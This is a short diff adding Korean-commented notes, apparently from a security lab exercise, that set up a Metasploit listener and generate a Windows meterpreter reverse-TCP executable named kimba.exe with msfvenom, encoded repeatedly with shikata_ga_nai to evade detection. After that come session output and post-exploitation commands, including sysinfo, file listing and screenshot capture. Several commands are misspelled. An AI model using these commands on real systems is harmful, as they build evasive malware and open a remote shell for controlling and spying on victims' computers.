@@ -1,0 +1,13 @@
+#handler.rc 모듈이 있어야 함
+service postgresql start
+cd 바탕화면/
+msfconsole -r handler.rc
+ # 새창에서 악성코드 만들기(kimba.exe)
+msffvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.5.6 LPORT=4444 -e x86/shikata_ga_nai -b `＼x00` -i 3 -f exe > kimba.exe
+Sending stange (957487 bytes) to 192.168.5.30
+seesions
+seesions -i -1
+sysinfo
+ls
+pwd
+screenshot
